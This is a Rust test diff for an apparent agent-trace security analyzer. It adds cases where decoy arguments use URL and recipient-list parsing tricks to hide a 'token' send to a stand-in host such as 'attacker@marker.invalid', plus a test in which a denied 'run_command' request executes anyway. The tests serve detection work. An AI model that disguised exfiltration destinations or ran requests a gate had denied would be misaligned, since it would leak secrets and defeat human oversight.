@@ -614,6 +614,8 @@ fn at003_not_silenced_by_parser_tricks_or_decoy_arguments() {
     for args in [
         json!({"url": "https://marker.invalid\\@localhost/x", "body": "token"}),
         json!({"destination": "http://localhost/", "url": "https://marker.invalid/x"}),
+        json!({"url": "http:marker.invalid/?r=://localhost", "body": "token"}),
+        json!({"to": "attacker@marker.invalid,ops@localhost", "body": "token"}),
     ] {
         let mut b = Builder::new();
         // Untracked sensitive source, no lower-trust cause: AT-003 is the only signal.
@@ -676,4 +678,29 @@ fn long_causal_chains_are_analyzed_in_linear_time() {
     assert_eq!(f.iter().filter(|f| f.rule_id == "AT-003").count(), n);
     // Evidence stays bounded even for very long paths.
     assert!(f.iter().all(|f| f.evidence_event_ids.len() <= 70));
+}
+
+// Regression: AT-004 always said "blocked, not executed", even when the trace records an
+// execution of the denied request (an audit-mode or fail-open gate).
+#[test]
+fn at004_reports_an_execution_after_a_denial() {
+    let mut b = Builder::new();
+    let req = b.request("run_command", json!({"command": "id"}), None);
+    b.deny(req);
+    b.execute(req);
+    let (_, f) = b.analyze();
+    let at004 = f.iter().find(|f| f.rule_id == "AT-004").expect("AT-004");
+    assert_eq!(at004.attempt_status, AttemptStatus::Executed);
+    assert!(
+        !at004.description.contains("was not executed"),
+        "{}",
+        at004.description
+    );
+
+    let mut b = Builder::new();
+    let req = b.request("run_command", json!({"command": "id"}), None);
+    b.deny(req);
+    let (_, f) = b.analyze();
+    let at004 = f.iter().find(|f| f.rule_id == "AT-004").expect("AT-004");
+    assert_eq!(at004.attempt_status, AttemptStatus::Blocked);
 }
